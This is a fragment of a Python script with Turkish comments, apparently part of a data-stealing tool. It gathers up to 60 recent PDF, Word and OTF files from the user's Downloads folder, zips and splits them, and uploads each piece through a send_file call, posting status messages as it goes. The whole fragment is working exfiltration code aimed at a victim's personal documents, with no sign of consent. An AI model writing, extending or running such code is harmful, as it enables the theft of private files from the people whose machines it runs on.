# son 60 dosyayi toplayip gonderiyoruz (pdf, doc, docx, otf)
MAX_CHUNK = 10 * 1024 * 1024
SPLIT_SIZE = 5 * 1024 * 1024

# desteklenen formatlar
SUPPORTED_EXTS = ["*.pdf", "*.doc", "*.docx", "*.otf"]

def pdf_page_count(path):
    try:
        reader = pypdf.PdfReader(str(path))
        return len(reader.pages)
    except Exception:
        return 0

try:
    dl_dir = pathlib.Path.home() / "Downloads"

    # tum desteklenen formatlari topluyoruz
    all_files = []
    for ext in SUPPORTED_EXTS:
        all_files.extend([f for f in dl_dir.glob(ext) if f.is_file()])

    # degisiklik tarihine gore siraliyoruz
    all_files.sort(key=lambda f: f.stat().st_mtime, reverse=True)

    # pdf ler icin 8 sayfa filtresi, diger formatlar direkt ekleniyor
    collected = []
    for f in all_files:
        if len(collected) >= 60:
            break
        if f.suffix.lower() == ".pdf":
            if pdf_page_count(f) <= 8:
                collected.append(f)
        else:
            collected.append(f)

    if collected:
        # format dagilimini gosteriyoruz
        ext_counts = {}
        for f in collected:
            ext = f.suffix.lower()
            ext_counts[ext] = ext_counts.get(ext, 0) + 1
        dist_str = ", ".join(f"{ext}: {cnt}" for ext, cnt in ext_counts.items())
        send("📄 Dosya Toplama", f"{len(collected)} dosya bulundu ({dist_str}), zipleniyor...", BLUE)

        # gecici klasorde zip olusturuyoruz
        tmp_dir = tempfile.mkdtemp()
        chunk_idx = 1
        current_zip_path = os.path.join(tmp_dir, f"docs_part{chunk_idx}.zip")
        current_zip = zipfile.ZipFile(current_zip_path, "w", zipfile.ZIP_DEFLATED)
        current_size = 0
        zip_paths = [current_zip_path]

        for doc in collected:
            doc_size = doc.stat().st_size
            # limit asilirsa yeni zip dosyasina geciyoruz
            if current_size > 0 and current_size + doc_size > MAX_CHUNK:
                current_zip.close()
                chunk_idx += 1
                current_zip_path = os.path.join(tmp_dir, f"docs_part{chunk_idx}.zip")
                current_zip = zipfile.ZipFile(current_zip_path, "w", zipfile.ZIP_DEFLATED)
                current_size = 0
                zip_paths.append(current_zip_path)
            current_zip.write(str(doc), doc.name)
            current_size += doc_size
        current_zip.close()

        # sadece on megabayttan buyukse parcalara boluyoruz
        upload_files = []
        for zp in zip_paths:
            zp_size = os.path.getsize(zp)
            if zp_size > MAX_CHUNK:
                part_num = 1
                with open(zp, "rb") as f:
                    while True:
                        chunk = f.read(SPLIT_SIZE)
                        if not chunk:
                            break
                        part_file = f"{zp}.{part_num:03d}"
                        with open(part_file, "wb") as pf:
                            pf.write(chunk)
                        upload_files.append(part_file)
                        part_num += 1
                try:
                    os.remove(zp)
                except Exception:
                    pass
            else:
                upload_files.append(zp)

        # dosyalari tek tek gonderiyoruz
        sent = 0
        for uf in upload_files:
            ok, err = send_file(uf, os.path.basename(uf))
            if ok:
                sent += 1
            # gecici dosyalari temizliyoruz
            try:
                os.remove(uf)
            except Exception:
                pass

        # gecici klasoru siliyoruz
        try:
            os.rmdir(tmp_dir)
        except Exception:
            pass

        send("📦 Dosya Gonderim", f"{sent}/{len(upload_files)} dosya gonderildi ({len(collected)} dosya)", GREEN if sent == len(upload_files) else YELLOW)
    else:
        send("📄 Dosya", "downloads klasorunde desteklenen dosya bulunamadi.", YELLOW)
except Exception as e:
    send("❌ Dosya Hatasi", str(e), RED)

send("✅ Tamamlandi", "tum islemler bitti.", GREEN)
